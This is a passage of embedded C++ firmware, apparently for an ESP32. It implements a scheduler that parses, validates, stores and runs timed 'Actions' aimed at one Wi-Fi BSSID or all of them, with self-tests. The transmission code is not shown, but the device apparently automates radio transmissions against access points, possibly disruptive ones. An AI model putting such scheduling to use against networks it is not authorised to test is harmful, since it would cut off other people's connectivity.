  for (size_t i = 0; i < fieldCount; ++i) {
    char* field = strtok_r(i == 0 ? buffer : nullptr, ",", &savePointer);
    if (field == nullptr || strlen(field) >= sizeof(fields[i])) return false;
    strcpy(fields[i], field);
  }
  return strtok_r(nullptr, ",", &savePointer) == nullptr;
}

bool addScheduleRecord(const ScheduleRecord& requested) {
  if (schedulerData.count >= MAX_SCHEDULES) {
    sendSimpleResponse("SCHED_ERROR:FULL");
    return false;
  }

  if (requested.scheduleType > SCHEDULE_RECURRING ||
      requested.actionType > SCHEDULE_ACTION_INDIVIDUAL ||
      requested.durationMode > SCHEDULE_FIXED_END_TIME ||
      !validLocalDateTime(requested.startYear, requested.startMonth,
                          requested.startDay, requested.startHour,
                          requested.startMinute) || requested.startAtUtc == 0) {
    sendSimpleResponse("SCHED_ERROR:INVALID_VALUE");
    return false;
  }

  if ((requested.scheduleType == SCHEDULE_ONE_TIME && requested.weekdays != 0) ||
      (requested.scheduleType == SCHEDULE_RECURRING &&
       (requested.weekdays == 0 || requested.weekdays > 0x7F))) {
    sendSimpleResponse("SCHED_ERROR:INVALID_REPEAT");
    return false;
  }

  if (requested.durationMode == SCHEDULE_ACTIVE_DURATION) {
    if (requested.fixedEndAtUtc != 0 || requested.fixedEndDayOffset != 0 ||
        requested.fixedEndHour != 0 || requested.fixedEndMinute != 0) {
      sendSimpleResponse("SCHED_ERROR:INVALID_DEADLINE_FIELDS");
      return false;
    }
  } else {
    if (requested.totalDurationSeconds != 0) {
      sendSimpleResponse("SCHED_ERROR:FIXED_END_HAS_NO_TOTAL_DURATION");
      return false;
    }
    if (requested.scheduleType == SCHEDULE_ONE_TIME) {
      if (requested.fixedEndAtUtc <= requested.startAtUtc ||
          requested.fixedEndDayOffset != 0 || requested.fixedEndHour != 0 ||
          requested.fixedEndMinute != 0) {
        sendSimpleResponse("SCHED_ERROR:INVALID_FIXED_END");
        return false;
      }
    } else {
      if (requested.fixedEndAtUtc != 0 || requested.fixedEndDayOffset > 30 ||
          requested.fixedEndHour > 23 || requested.fixedEndMinute > 59) {
        sendSimpleResponse("SCHED_ERROR:INVALID_FIXED_END");
        return false;
      }
      const uint32_t startMinutes = requested.startHour * 60U + requested.startMinute;
      const uint32_t endMinutes = requested.fixedEndDayOffset * 1440U +
                                  requested.fixedEndHour * 60U + requested.fixedEndMinute;
      if (endMinutes <= startMinutes) {
        sendSimpleResponse("SCHED_ERROR:INVALID_FIXED_END");
        return false;
      }
    }
  }

  if (requested.executionDurationSeconds == 0 && requested.pauseIntervalSeconds != 0) {
    sendSimpleResponse("SCHED_ERROR:UNLIMITED_EXECUTION_CANNOT_HAVE_PAUSE");
    return false;
  }
  if (requested.executionDurationSeconds > 604800UL ||
      requested.pauseIntervalSeconds > 604800UL ||
      requested.totalDurationSeconds > 315360000UL) {
    sendSimpleResponse("SCHED_ERROR:DURATION_TOO_LARGE");
    return false;
  }

  char normalizedTarget[18] = {0};
  if (!normalizeScheduleTarget(
          requested.actionType == SCHEDULE_ACTION_ALL ? "-" : requested.targetBssid,
          requested.actionType, normalizedTarget)) {
    sendSimpleResponse("SCHED_ERROR:INVALID_TARGET");
    return false;
  }

  const uint16_t id = allocateScheduleId();
  if (id == 0) {
    sendSimpleResponse("SCHED_ERROR:NO_ID");
    return false;
  }

  const SchedulerStorage previous = schedulerData;
  ScheduleRecord record = requested;
  record.id = id;
  memset(record.targetBssid, 0, sizeof(record.targetBssid));
  strncpy(record.targetBssid, normalizedTarget, sizeof(record.targetBssid) - 1);
  record.enabled = true;
  schedulerData.records[schedulerData.count++] = record;

  if (!saveSchedulerStorage()) {
    schedulerData = previous;
    sendSimpleResponse("SCHED_ERROR:SAVE_FAILED");
    return false;
  }

  char response[40];
  snprintf(response, sizeof(response), "SCHED_ADDED:%u", static_cast<unsigned int>(id));
  sendSimpleResponse(response);
  Serial.printf("[Scheduler] Added schedule ID %u.\n", static_cast<unsigned int>(id));
  return true;
}

// Command format:
// SCHED_ADD_ONCE:year,month,day,hour,minute,startUtc,actionType,target,durationMode,totalSeconds,fixedEndUtc,executionSeconds,pauseSeconds
void addOneTimeSchedule(const char* command) {
  char fields[13][24] = {};
  if (!parseCsvFields(command + 15, fields, 13)) {
    sendSimpleResponse("SCHED_ERROR:BAD_FORMAT");
    return;
  }

  uint32_t v[13] = {};
  const uint8_t numericIndexes[] = {0,1,2,3,4,5,6,8,9,10,11,12};
  for (uint8_t i = 0; i < sizeof(numericIndexes); ++i) {
    const uint8_t index = numericIndexes[i];
    if (!parseUnsignedValue(fields[index], v[index])) {
      sendSimpleResponse("SCHED_ERROR:INVALID_VALUE");
      return;
    }
  }

  if (v[0] > 65535 || v[1] > 255 || v[2] > 255 || v[3] > 255 ||
      v[4] > 255 || v[6] > 1 || v[8] > 1) {
    sendSimpleResponse("SCHED_ERROR:INVALID_VALUE");
    return;
  }

  ScheduleRecord record = {};
  record.scheduleType = SCHEDULE_ONE_TIME;
  record.startYear = static_cast<uint16_t>(v[0]);
  record.startMonth = static_cast<uint8_t>(v[1]);
  record.startDay = static_cast<uint8_t>(v[2]);
  record.startHour = static_cast<uint8_t>(v[3]);
  record.startMinute = static_cast<uint8_t>(v[4]);
  record.startAtUtc = v[5];
  record.actionType = static_cast<uint8_t>(v[6]);
  if (record.actionType == SCHEDULE_ACTION_INDIVIDUAL) {
    if (strlen(fields[7]) != 17) {
      sendSimpleResponse("SCHED_ERROR:INVALID_TARGET");
      return;
    }
    strncpy(record.targetBssid, fields[7], sizeof(record.targetBssid) - 1);
  } else if (strcmp(fields[7], "-") != 0) {
    sendSimpleResponse("SCHED_ERROR:INVALID_TARGET");
    return;
  }
  record.durationMode = static_cast<uint8_t>(v[8]);
  record.totalDurationSeconds = v[9];
  record.fixedEndAtUtc = v[10];
  record.executionDurationSeconds = v[11];
  record.pauseIntervalSeconds = v[12];
  addScheduleRecord(record);
}

// Command format:
// SCHED_ADD_RECUR:year,month,day,hour,minute,weekdays,firstStartUtc,actionType,target,durationMode,totalSeconds,endDayOffset,endHour,endMinute,executionSeconds,pauseSeconds
void addRecurringSchedule(const char* command) {
  char fields[16][24] = {};
  if (!parseCsvFields(command + 16, fields, 16)) {
    sendSimpleResponse("SCHED_ERROR:BAD_FORMAT");
    return;
  }

  uint32_t v[16] = {};
  for (uint8_t i = 0; i < 16; ++i) {
    if (i == 8) continue; // Target is a BSSID or '-'.
    if (!parseUnsignedValue(fields[i], v[i])) {
      sendSimpleResponse("SCHED_ERROR:INVALID_VALUE");
      return;
    }
  }
  if (v[0] > 65535 || v[1] > 255 || v[2] > 255 || v[3] > 255 ||
      v[4] > 255 || v[5] > 255 || v[7] > 1 || v[9] > 1 ||
      v[11] > 255 || v[12] > 255 || v[13] > 255) {
    sendSimpleResponse("SCHED_ERROR:INVALID_VALUE");
    return;
  }

  ScheduleRecord record = {};
  record.scheduleType = SCHEDULE_RECURRING;
  record.startYear = static_cast<uint16_t>(v[0]);
  record.startMonth = static_cast<uint8_t>(v[1]);
  record.startDay = static_cast<uint8_t>(v[2]);
  record.startHour = static_cast<uint8_t>(v[3]);
  record.startMinute = static_cast<uint8_t>(v[4]);
  record.weekdays = static_cast<uint8_t>(v[5]);
  record.startAtUtc = v[6];
  record.actionType = static_cast<uint8_t>(v[7]);
  if (record.actionType == SCHEDULE_ACTION_INDIVIDUAL) {
    if (strlen(fields[8]) != 17) {
      sendSimpleResponse("SCHED_ERROR:INVALID_TARGET");
      return;
    }
    strncpy(record.targetBssid, fields[8], sizeof(record.targetBssid) - 1);
  } else if (strcmp(fields[8], "-") != 0) {
    sendSimpleResponse("SCHED_ERROR:INVALID_TARGET");
    return;
  }
  record.durationMode = static_cast<uint8_t>(v[9]);
  record.totalDurationSeconds = v[10];
  record.fixedEndDayOffset = static_cast<uint8_t>(v[11]);
  record.fixedEndHour = static_cast<uint8_t>(v[12]);
  record.fixedEndMinute = static_cast<uint8_t>(v[13]);
  record.executionDurationSeconds = v[14];
  record.pauseIntervalSeconds = v[15];
  addScheduleRecord(record);
}

bool discardPausedAndPendingInstancesForSchedule(uint16_t scheduleId);

void changeScheduleEnabled(const char* command) {
  char buffer[24] = {0};
  strncpy(buffer, command + 13, sizeof(buffer) - 1);
  char* separator = strchr(buffer, ',');
  if (separator == nullptr) {
    sendSimpleResponse("SCHED_ERROR:BAD_FORMAT");
    return;
  }
  *separator = '\0';
  uint32_t id, enabled;
  if (!parseUnsignedValue(buffer, id) || id == 0 ||
      !parseUnsignedValue(separator + 1, enabled) || enabled > 1) {
    sendSimpleResponse("SCHED_ERROR:INVALID_VALUE");
    return;
  }
  for (uint8_t i = 0; i < schedulerData.count; ++i) {
    if (schedulerData.records[i].id == id) {
      const bool previous = schedulerData.records[i].enabled;
      schedulerData.records[i].enabled = enabled == 1;
      if (!saveSchedulerStorage()) {
        schedulerData.records[i].enabled = previous;
        sendSimpleResponse("SCHED_ERROR:SAVE_FAILED");
        return;
      }
      if (enabled == 0) {
        discardPausedAndPendingInstancesForSchedule(
            static_cast<uint16_t>(id));
      }
      sendSimpleResponse(enabled ? "SCHED_ENABLED" : "SCHED_DISABLED");
      return;
    }
  }
  sendSimpleResponse("SCHED_ERROR:NOT_FOUND");
}

void deleteSchedule(const char* command) {
  uint32_t id;
  if (!parseUnsignedValue(command + 13, id) || id == 0) {
    sendSimpleResponse("SCHED_ERROR:INVALID_ID");
    return;
  }
  for (uint8_t i = 0; i < schedulerData.count; ++i) {
    if (schedulerData.records[i].id == id) {
      const SchedulerStorage previous = schedulerData;
      for (uint8_t j = i; j + 1 < schedulerData.count; ++j) {
        schedulerData.records[j] = schedulerData.records[j + 1];
      }
      --schedulerData.count;
      memset(&schedulerData.records[schedulerData.count], 0, sizeof(ScheduleRecord));
      if (!saveSchedulerStorage()) {
        schedulerData = previous;
        sendSimpleResponse("SCHED_ERROR:SAVE_FAILED");
        return;
      }
      discardPausedAndPendingInstancesForSchedule(
          static_cast<uint16_t>(id));
      sendSimpleResponse("SCHED_DELETED");
      return;
    }
  }
  sendSimpleResponse("SCHED_ERROR:NOT_FOUND");
}

// A non-destructive round-trip check of the revised Stage 6 schedule records.
// It uses a separate temporary key; saved schedules and Wi-Fi records are untouched.
void testSchedulerStorage() {
  ScheduleRecord testRecords[2] = {};

  // Active-duration schedule: zero total duration means unlimited.
  testRecords[0].id = 4321;
  testRecords[0].scheduleType = SCHEDULE_RECURRING;
  testRecords[0].actionType = SCHEDULE_ACTION_ALL;
  testRecords[0].startYear = 2026;
  testRecords[0].startMonth = 11;
  testRecords[0].startDay = 17;
  testRecords[0].startHour = 13;
  testRecords[0].startMinute = 30;
  testRecords[0].weekdays = 0x3E;
  testRecords[0].durationMode = SCHEDULE_ACTIVE_DURATION;
  testRecords[0].totalDurationSeconds = 0;
  testRecords[0].executionDurationSeconds = 20;
  testRecords[0].pauseIntervalSeconds = 10;
  testRecords[0].enabled = true;

  // Fixed-end schedule: the UTC deadline is authoritative for this one-time record.
  testRecords[1].id = 4322;
  testRecords[1].scheduleType = SCHEDULE_ONE_TIME;
  testRecords[1].actionType = SCHEDULE_ACTION_INDIVIDUAL;
  strncpy(testRecords[1].targetBssid, "AA:BB:CC:DD:EE:FF",
          sizeof(testRecords[1].targetBssid) - 1);
  testRecords[1].startAtUtc = 1794893400UL;
  testRecords[1].durationMode = SCHEDULE_FIXED_END_TIME;
  testRecords[1].fixedEndAtUtc = 1794922200UL;
  testRecords[1].executionDurationSeconds = 60;
  testRecords[1].pauseIntervalSeconds = 15;
  testRecords[1].enabled = true;

  const size_t written = schedulerPreferences.putBytes(
      "schema_test", testRecords, sizeof(testRecords));
  ScheduleRecord readBack[2] = {};
  const size_t readLength = schedulerPreferences.getBytesLength("schema_test");
  const size_t readCount = (readLength == sizeof(readBack))
      ? schedulerPreferences.getBytes("schema_test", readBack, sizeof(readBack))
      : 0;
  schedulerPreferences.remove("schema_test");

  const bool passed = written == sizeof(testRecords) &&
                      readCount == sizeof(readBack) &&
                      memcmp(testRecords, readBack, sizeof(testRecords)) == 0;

  if (passed) {
    Serial.println("[Scheduler] Stage 6 schedule-record round-trip PASSED.");
    sendSimpleResponse("SCHED_STORAGE_TEST:OK");
  } else {
    Serial.println("[Scheduler] Stage 6 schedule-record round-trip FAILED.");
    sendSimpleResponse("SCHED_STORAGE_TEST:FAILED");
  }
}

void sendActiveActionInstanceStatus() {
  if (activeActionInstance.state == ACTION_INSTANCE_EMPTY) {
    sendSimpleResponse("SCHED_ACTIVE_INSTANCE:NONE");
    return;
  }

  char response[128];
  snprintf(response, sizeof(response), "SCHED_ACTIVE_INSTANCE:%lu,%u,%u,%u",
           static_cast<unsigned long>(activeActionInstance.instanceId),
           static_cast<unsigned int>(activeActionInstance.scheduleId),
           static_cast<unsigned int>(activeActionInstance.actionType),
           static_cast<unsigned int>(activeActionInstance.state));
  sendSimpleResponse(response);
}


// Stage 8S: build a compact, read-only snapshot of scheduler runtime state.
// Field order: global state, active instance ID, active instance state,
// interrupted count, pending count, saved schedule count, runner busy flag.
void formatSchedulerRuntimeStatus(char* output, size_t outputSize) {
  const char* globalState = schedulerPauseAllRequested ? "PAUSED" : "RUNNING";
  const uint32_t activeId =
      activeActionInstance.state == ACTION_INSTANCE_EMPTY
          ? 0 : activeActionInstance.instanceId;
  const uint8_t activeState =
      activeActionInstance.state == ACTION_INSTANCE_EMPTY
          ? ACTION_INSTANCE_EMPTY : activeActionInstance.state;
  const bool runnerBusy = actionActive || actionTaskHandle != nullptr;

  snprintf(output, outputSize, "SCHED_RUNTIME_STATUS:%s,%lu,%u,%u,%u,%u,%u",
           globalState,
           static_cast<unsigned long>(activeId),
           static_cast<unsigned int>(activeState),
           static_cast<unsigned int>(interruptedActionCount),
           static_cast<unsigned int>(pendingScheduledActionCount),
           static_cast<unsigned int>(schedulerData.count),
           runnerBusy ? 1U : 0U);
}

void sendSchedulerRuntimeStatus() {
  char response[128];
  formatSchedulerRuntimeStatus(response, sizeof(response));
  sendSimpleResponse(response);
}

// Stage 8S diagnostic: verify the status snapshot is internally consistent.
// Run this while the Action runner is idle so the values cannot change mid-test.
void testSchedulerRuntimeStatus() {
  if (actionActive || actionTaskHandle != nullptr) {
    sendSimpleResponse("SCHED_RUNTIME_STATUS_TEST:BUSY");
    return;
  }

  char response[128] = {0};
  formatSchedulerRuntimeStatus(response, sizeof(response));

  const char* expectedGlobalState =
      schedulerPauseAllRequested ? "PAUSED" : "RUNNING";
  const uint32_t expectedActiveId =
      activeActionInstance.state == ACTION_INSTANCE_EMPTY
          ? 0 : activeActionInstance.instanceId;
  const uint8_t expectedActiveState =
      activeActionInstance.state == ACTION_INSTANCE_EMPTY
          ? ACTION_INSTANCE_EMPTY : activeActionInstance.state;

  char expected[128] = {0};
  snprintf(expected, sizeof(expected),
           "SCHED_RUNTIME_STATUS:%s,%lu,%u,%u,%u,%u,0",
           expectedGlobalState,
           static_cast<unsigned long>(expectedActiveId),
           static_cast<unsigned int>(expectedActiveState),
           static_cast<unsigned int>(interruptedActionCount),
           static_cast<unsigned int>(pendingScheduledActionCount),
           static_cast<unsigned int>(schedulerData.count));

  const bool passed =
      interruptedActionCount <= MAX_ACTION_INSTANCES &&
      pendingScheduledActionCount <= MAX_PENDING_SCHEDULED_ACTIONS &&
      schedulerData.count <= MAX_SCHEDULES &&
      strcmp(response, expected) == 0;

  if (passed) {
    Serial.println("[Scheduler] Stage 8S runtime status consistency test PASSED.");
    sendSimpleResponse("SCHED_RUNTIME_STATUS_TEST:OK");
  } else {
    Serial.println("[Scheduler] Stage 8S runtime status consistency test FAILED.");
    sendSimpleResponse("SCHED_RUNTIME_STATUS_TEST:FAILED");
  }
}

bool pushInterruptedAction(const ActionInstance& instance) {
  if (interruptedActionCount >= MAX_ACTION_INSTANCES) return false;
  interruptedActionStack[interruptedActionCount] = instance;
  interruptedActionStack[interruptedActionCount].state = ACTION_INSTANCE_PAUSED;
  interruptedActionCount++;
  return true;
}

bool popInterruptedAction(ActionInstance& instance) {
  if (interruptedActionCount == 0) return false;
  interruptedActionCount--;
  instance = interruptedActionStack[interruptedActionCount];
  memset(&interruptedActionStack[interruptedActionCount], 0,
         sizeof(ActionInstance));
  return true;
}

// Stage 8P: resume the most recently interrupted Action after all earlier-due
// pending Actions have been dispatched. The saved timing snapshot is reused.
bool resumeMostRecentInterruptedAction(uint32_t nowUtc) {
  while (interruptedActionCount > 0) {
    ActionInstance instance = {};
    if (!popInterruptedAction(instance)) return false;

    // A Fixed End Time Action may expire while it is waiting on the stack.
    if (instance.durationMode == SCHEDULE_FIXED_END_TIME &&
        (instance.fixedEndAtUtc == 0 || nowUtc == 0 ||
         nowUtc >= instance.fixedEndAtUtc)) {
      Serial.printf("[Scheduler] Discarded expired interrupted instance %lu (schedule %u).\n",
                    static_cast<unsigned long>(instance.instanceId),
                    static_cast<unsigned int>(instance.scheduleId));
      continue;
    }

    if (instance.timingPhase == ACTION_TIMING_FINISHED) {
      Serial.printf("[Scheduler] Discarded finished interrupted instance %lu.\n",
                    static_cast<unsigned long>(instance.instanceId));
      continue;
    }

    instance.state = ACTION_INSTANCE_PENDING;
    instance.lastTimingUpdateMs = millis();
    if (!startResumedActionTask(instance)) {
      // Do not lose the saved Action if the FreeRTOS task cannot be created.
      instance.state = ACTION_INSTANCE_PAUSED;
      if (!pushInterruptedAction(instance)) {
        Serial.println("[Scheduler] ERROR: could not restore interrupted Action to stack.");
      } else {
        Serial.println("[Scheduler] Resume deferred; interrupted Action remains on stack.");
      }
      return false;
    }

    Serial.printf("[Scheduler] Resumed interrupted instance %lu (schedule %u).\n",
                  static_cast<unsigned long>(activeActionInstance.instanceId),
                  static_cast<unsigned int>(activeActionInstance.scheduleId));
    sendBLEMessage("{\"event\":\"TX_RESUMED\",\"reason\":\"SCHEDULE_INTERRUPT\"}");
    return true;
  }
  return false;
}

// Remove one paused instance without disturbing the order of the others.
// This is needed when a user stops an individual scheduled Action or deletes
// its schedule while that Action is waiting in the interruption stack.
bool removeInterruptedActionById(uint32_t instanceId) {
  for (uint8_t i = 0; i < interruptedActionCount; ++i) {
    if (interruptedActionStack[i].instanceId != instanceId) continue;

    for (uint8_t j = i; j + 1 < interruptedActionCount; ++j) {
      interruptedActionStack[j] = interruptedActionStack[j + 1];
    }
    interruptedActionCount--;
    memset(&interruptedActionStack[interruptedActionCount], 0,
           sizeof(ActionInstance));
    return true;
  }
  return false;
}

// Stage 9C: remove every queued occurrence belonging to one schedule while
// preserving the chronological order of all other pending instances.
bool removePendingScheduledActionByScheduleId(uint16_t scheduleId) {
  bool removed = false;
  for (uint8_t i = 0; i < pendingScheduledActionCount;) {
    if (pendingScheduledActions[i].scheduleId != scheduleId) {
      ++i;
      continue;
    }
    for (uint8_t j = i; j + 1 < pendingScheduledActionCount; ++j) {
      pendingScheduledActions[j] = pendingScheduledActions[j + 1];
    }
    pendingScheduledActionCount--;
    memset(&pendingScheduledActions[pendingScheduledActionCount], 0,
           sizeof(ActionInstance));
    removed = true;
  }
  return removed;
}

// Remove an interrupted instance by its saved schedule ID. The relative LIFO
// order of every remaining interrupted Action is left unchanged.
bool removeInterruptedActionByScheduleId(uint16_t scheduleId) {
  bool removed = false;
  for (uint8_t i = 0; i < interruptedActionCount;) {
    if (interruptedActionStack[i].scheduleId != scheduleId) {
      ++i;
      continue;
    }
    for (uint8_t j = i; j + 1 < interruptedActionCount; ++j) {
      interruptedActionStack[j] = interruptedActionStack[j + 1];
    }
    interruptedActionCount--;
    memset(&interruptedActionStack[interruptedActionCount], 0,
           sizeof(ActionInstance));
    removed = true;
  }
  return removed;
}

// Stage 9E: disabling or deleting a saved schedule must discard its paused
// and pending runtime instances. A currently paused foreground runner is
// cooperatively aborted; unrelated Actions retain their stack/queue order.
bool discardPausedAndPendingInstancesForSchedule(uint16_t scheduleId) {
  if (scheduleId == 0) return false;
  bool removed = false;

  if (activeActionInstance.scheduleId == scheduleId &&
      activeActionInstance.state == ACTION_INSTANCE_PAUSED &&
      actionActive && actionTaskHandle != nullptr) {
    actionPauseRequested = false;
    actionYieldRequested = false;
    txAbortRequested = true;
    removed = true;
    Serial.printf("[Scheduler] Abort requested for paused foreground instance of schedule %u.\n",
                  static_cast<unsigned int>(scheduleId));
  }

  if (removeInterruptedActionByScheduleId(scheduleId)) removed = true;
  if (removePendingScheduledActionByScheduleId(scheduleId)) removed = true;
  return removed;
}

// Stage 9E diagnostic: verify that disable/delete cleanup removes every
// paused/pending instance for one schedule while preserving unrelated order.
void testDisabledDeletedScheduleRuntimeCleanup() {
  if (actionActive || actionTaskHandle != nullptr ||
      activeActionInstance.state != ACTION_INSTANCE_EMPTY ||
      interruptedActionCount != 0 || pendingScheduledActionCount != 0) {
    sendSimpleResponse("SCHED_DISABLED_DELETE_CLEANUP_TEST:BUSY");
    return;
  }

  ActionInstance savedStack[MAX_ACTION_INSTANCES] = {};
  ActionInstance savedPending[MAX_PENDING_SCHEDULED_ACTIONS] = {};
  const uint8_t savedStackCount = interruptedActionCount;
  const uint8_t savedPendingCount = pendingScheduledActionCount;
  const uint32_t savedNextInstanceId = nextActionInstanceId;
  memcpy(savedStack, interruptedActionStack, sizeof(savedStack));
  memcpy(savedPending, pendingScheduledActions, sizeof(savedPending));

  const uint16_t targetScheduleId = 65011;
  const uint16_t otherScheduleId = 65012;
  ActionInstance stackOtherOld = {};
  stackOtherOld.instanceId = 7101;
  stackOtherOld.scheduleId = otherScheduleId;
  stackOtherOld.state = ACTION_INSTANCE_PAUSED;
  ActionInstance stackTarget = stackOtherOld;
  stackTarget.instanceId = 7102;
  stackTarget.scheduleId = targetScheduleId;
  ActionInstance stackOtherNew = stackOtherOld;
  stackOtherNew.instanceId = 7103;

  ActionInstance pendingTarget = {};
  pendingTarget.instanceId = 7201;
  pendingTarget.scheduleId = targetScheduleId;
  pendingTarget.state = ACTION_INSTANCE_PENDING;
  pendingTarget.dueAtUtc = 1790000000UL;
  ActionInstance pendingOther = pendingTarget;
  pendingOther.instanceId = 7202;
  pendingOther.scheduleId = otherScheduleId;

  bool passed = pushInterruptedAction(stackOtherOld) &&
      pushInterruptedAction(stackTarget) &&
      pushInterruptedAction(stackOtherNew) &&
      enqueuePendingScheduledAction(pendingTarget) &&
      enqueuePendingScheduledAction(pendingOther);

  passed = passed && discardPausedAndPendingInstancesForSchedule(targetScheduleId);
  passed = passed && interruptedActionCount == 2 &&
      interruptedActionStack[0].instanceId == 7101 &&
      interruptedActionStack[1].instanceId == 7103 &&
      pendingScheduledActionCount == 1 &&
      pendingScheduledActions[0].instanceId == 7202 &&
      !discardPausedAndPendingInstancesForSchedule(65500);

  // Restore every runtime collection exactly as it was before this diagnostic.
  memcpy(interruptedActionStack, savedStack, sizeof(savedStack));
  interruptedActionCount = savedStackCount;
  memcpy(pendingScheduledActions, savedPending, sizeof(savedPending));
  pendingScheduledActionCount = savedPendingCount;
  nextActionInstanceId = savedNextInstanceId;

  if (passed) {
    Serial.println("[Scheduler] Stage 9E disabled/deleted schedule runtime cleanup test PASSED.");
    sendSimpleResponse("SCHED_DISABLED_DELETE_CLEANUP_TEST:OK");
  } else {
    Serial.println("[Scheduler] Stage 9E disabled/deleted schedule runtime cleanup test FAILED.");
    sendSimpleResponse("SCHED_DISABLED_DELETE_CLEANUP_TEST:FAILED");
  }
}

// Stage 9F: verify one-time schedule lifecycle rules without modifying Flash.
// An enabled due schedule queues once; disabling removes its queued instance;
// deleting a schedule removes its configuration and any remaining runtime
// instance; unrelated schedules and recurring configuration remain intact.
void testSavedScheduleLifecycleRules() {
  if (actionActive || actionTaskHandle != nullptr ||
      activeActionInstance.state != ACTION_INSTANCE_EMPTY ||
      interruptedActionCount != 0 || pendingScheduledActionCount != 0) {
    sendSimpleResponse("SCHED_LIFECYCLE_TEST:BUSY");
    return;
  }

  const SchedulerStorage originalStorage = schedulerData;
  const uint32_t originalNextInstanceId = nextActionInstanceId;
  bool passed = true;

  memset(&schedulerData, 0, sizeof(schedulerData));
  schedulerData.version = SCHEDULER_STORAGE_VERSION;
  schedulerData.nextId = 65024;
  schedulerData.count = 3;

  ScheduleRecord& oneTimeToDisable = schedulerData.records[0];
  oneTimeToDisable.id = 65021;
  oneTimeToDisable.scheduleType = SCHEDULE_ONE_TIME;
  oneTimeToDisable.actionType = SCHEDULE_ACTION_ALL;
  oneTimeToDisable.startAtUtc = 1000;
  oneTimeToDisable.durationMode = SCHEDULE_ACTIVE_DURATION;
  oneTimeToDisable.totalDurationSeconds = 60;
  oneTimeToDisable.enabled = true;

  ScheduleRecord& oneTimeToDelete = schedulerData.records[1];
  oneTimeToDelete.id = 65022;
  oneTimeToDelete.scheduleType = SCHEDULE_ONE_TIME;
  oneTimeToDelete.actionType = SCHEDULE_ACTION_ALL;
  oneTimeToDelete.startAtUtc = 1000;
  oneTimeToDelete.durationMode = SCHEDULE_ACTIVE_DURATION;
  oneTimeToDelete.totalDurationSeconds = 60;
  oneTimeToDelete.enabled = true;

  ScheduleRecord& recurringToPreserve = schedulerData.records[2];
  recurringToPreserve.id = 65023;
  recurringToPreserve.scheduleType = SCHEDULE_RECURRING;
  recurringToPreserve.actionType = SCHEDULE_ACTION_ALL;
  recurringToPreserve.startYear = 2026;
  recurringToPreserve.startMonth = 11;
  recurringToPreserve.startDay = 18;
  recurringToPreserve.startHour = 12;
  recurringToPreserve.startMinute = 0;
  recurringToPreserve.weekdays = 0x7F;
  recurringToPreserve.enabled = true;

  clearPendingScheduledActions();
  nextActionInstanceId = 1;

  // Both enabled one-time schedules become due, and a second poll adds no duplicates.
  passed = collectDueOneTimeSchedules(1100) == 2 &&
      pendingScheduledActionCount == 2 &&
      collectDueOneTimeSchedules(1100) == 0 &&
      pendingScheduledActionCount == 2;

  // Disabling one saved schedule must remove only its queued instance.
  if (passed) {
    schedulerData.records[0].enabled = false;
    passed = discardPausedAndPendingInstancesForSchedule(65021) &&
        pendingScheduledActionCount == 1 &&
        pendingScheduledActions[0].scheduleId == 65022 &&
        collectDueOneTimeSchedules(1100) == 0 &&
        pendingScheduledActionCount == 1;
  }

  // Deleting the other one-time schedule removes its runtime item and record.
  if (passed) {
    passed = discardPausedAndPendingInstancesForSchedule(65022);
    for (uint8_t i = 0; passed && i < schedulerData.count; ++i) {
      if (schedulerData.records[i].id != 65022) continue;
      for (uint8_t j = i; j + 1 < schedulerData.count; ++j) {
        schedulerData.records[j] = schedulerData.records[j + 1];
      }
      --schedulerData.count;
      memset(&schedulerData.records[schedulerData.count], 0,
             sizeof(ScheduleRecord));
      break;
    }
    passed = passed && pendingScheduledActionCount == 0 &&
        schedulerData.count == 2 &&
        schedulerData.records[0].id == 65021 &&
        !schedulerData.records[0].enabled &&
        schedulerData.records[1].id == 65023 &&
        schedulerData.records[1].scheduleType == SCHEDULE_RECURRING &&
        schedulerData.records[1].enabled &&
        collectDueOneTimeSchedules(1100) == 0 &&
        pendingScheduledActionCount == 0;
  }

  clearPendingScheduledActions();
  schedulerData = originalStorage;
  nextActionInstanceId = originalNextInstanceId;

  if (passed) {
    Serial.println("[Scheduler] Stage 9F saved schedule lifecycle rules test PASSED.");
    sendSimpleResponse("SCHED_LIFECYCLE_TEST:OK");
  } else {
    Serial.println("[Scheduler] Stage 9F saved schedule lifecycle rules test FAILED.");
    sendSimpleResponse("SCHED_LIFECYCLE_TEST:FAILED");
  }
}

// Stage 8J: verify saved schedule settings are copied into a pending instance.
void testScheduledActionInstanceInitialization() {
  if (actionActive || actionTaskHandle != nullptr || interruptedActionCount != 0) {
    sendSimpleResponse("SCHED_INSTANCE_INIT_TEST:BUSY");
    return;
  }

  ScheduleRecord individual = {};
  individual.id = 41;
  individual.scheduleType = SCHEDULE_ONE_TIME;
  individual.actionType = SCHEDULE_ACTION_INDIVIDUAL;
  strncpy(individual.targetBssid, "AA:BB:CC:DD:EE:FF",
          sizeof(individual.targetBssid) - 1);
  individual.durationMode = SCHEDULE_ACTIVE_DURATION;
  individual.totalDurationSeconds = 600;
  individual.executionDurationSeconds = 30;
  individual.pauseIntervalSeconds = 10;

  ActionInstance individualInstance = {};
  bool passed = initializeScheduledActionInstance(
      individual, 2000, 0, individualInstance);
  passed = passed && individualInstance.scheduleId == 41 &&
      individualInstance.actionType == SCHEDULE_ACTION_INDIVIDUAL &&
      individualInstance.state == ACTION_INSTANCE_PENDING &&
      individualInstance.dueAtUtc == 2000 &&
      individualInstance.timingConfigured &&
      individualInstance.durationMode == SCHEDULE_ACTIVE_DURATION &&
      individualInstance.remainingTotalActiveSeconds == 600 &&
      individualInstance.executionDurationSeconds == 30 &&
      individualInstance.remainingExecutionSeconds == 30 &&
      individualInstance.pauseIntervalSeconds == 10 &&
      strcmp(individualInstance.targetBssid, "AA:BB:CC:DD:EE:FF") == 0 &&
      strcmp(individualInstance.command, "ACTION:AA:BB:CC:DD:EE:FF") == 0;

  ScheduleRecord allAction = {};
  allAction.id = 42;
  allAction.scheduleType = SCHEDULE_RECURRING;
  allAction.actionType = SCHEDULE_ACTION_ALL;
  allAction.durationMode = SCHEDULE_FIXED_END_TIME;
  allAction.executionDurationSeconds = 45;
  allAction.pauseIntervalSeconds = 5;

  ActionInstance allInstance = {};
  passed = passed && initializeScheduledActionInstance(
      allAction, 3000, 3900, allInstance);
  passed = passed && allInstance.scheduleId == 42 &&
      allInstance.actionType == SCHEDULE_ACTION_ALL &&
      allInstance.state == ACTION_INSTANCE_PENDING &&
      allInstance.durationMode == SCHEDULE_FIXED_END_TIME &&
      allInstance.fixedEndAtUtc == 3900 &&
      allInstance.executionDurationSeconds == 45 &&
      allInstance.pauseIntervalSeconds == 5 &&
      strcmp(allInstance.command, "ACTION_ALL") == 0;

  // Invalid fixed deadlines must not create runnable instances.
